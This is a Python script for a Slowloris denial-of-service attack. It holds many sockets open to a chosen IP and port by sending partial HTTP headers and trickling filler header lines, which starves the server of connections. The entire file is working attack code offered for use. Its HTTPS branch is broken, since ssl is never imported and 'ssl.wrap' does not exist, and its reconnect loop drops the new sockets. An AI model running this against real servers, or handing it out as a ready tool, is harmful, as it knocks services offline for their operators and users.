import argparse
import socket
import random
import time

# Init parser
parser = argparse.ArgumentParser(description="Slowloris-Low bandwith attack scrip")
parser.add_argument("--ip", "-i", default="192.168.0.1", help="target ip address")
parser.add_argument("--port", "-p", default="80", type=int, help="target port")
parser.add_argument("--https", dest="https", action="store_true")
parser.add_argument("--numsockets", "-ns", dest="numsockets", default=150, type=int, help="The number of sockets will be connected to the host")
parser.add_argument("--sleeptime", dest="sleeptime", default=15, type=int, help="Time to sleep between each header sent.")
args = parser.parse_args()

print("IP={}\nPORT={}\nNUMSOCKETS={}\nHTTPS={}\nSLEEPTIME={}\n".format(args.ip, args.port, args.numsockets, args.https, args.sleeptime))

# Read agents file 
agents = []
with open("agents.txt", "r") as content:
    for line in content:
        agents.append(line.rstrip('\n'))

def _initsocket_(ip, port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    if args.https:
        s = ssl.wrap(s)

    s.connect((ip, port))

    msg_header1 = "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
    msg_header2 = "User-Agent: {}\r\n".format(random.choice(agents)).encode("utf-8")
    msg_header3 = "{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8")
#    print(msg_header1, "\n", msg_header2, "\n", msg_header3, "\n")
    s.send(msg_header1)
    s.send(msg_header2)
    s.send(msg_header3)
    return s

def _performattack_():
    sockets_list = []
    sockets_count = args.numsockets
    for i in range(sockets_count):
        try:
            s = _initsocket_(args.ip, args.port)
        except socket.error:
            break
        sockets_list.append(s)

    while True:
        try:
            for s in list(sockets_list):
                try:
                    msg = "x-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
#                    print(msg)
                    s.send(msg)
                except socket.error:
                    sockets_list.remove(s)

            for j in range(sockets_count - len(sockets_list)):
                try:
                    s = _initsocket_(args.ip, args.port)
                except socket.error:
                    break

            time.sleep(args.sleeptime)

        except (KeyboardInterrupt, SystemExit):
#            print("Stopping Slowloris")
            for s in list(sockets_list):
                s.close()
                sockets_list.remove(s)

            break

_performattack_()

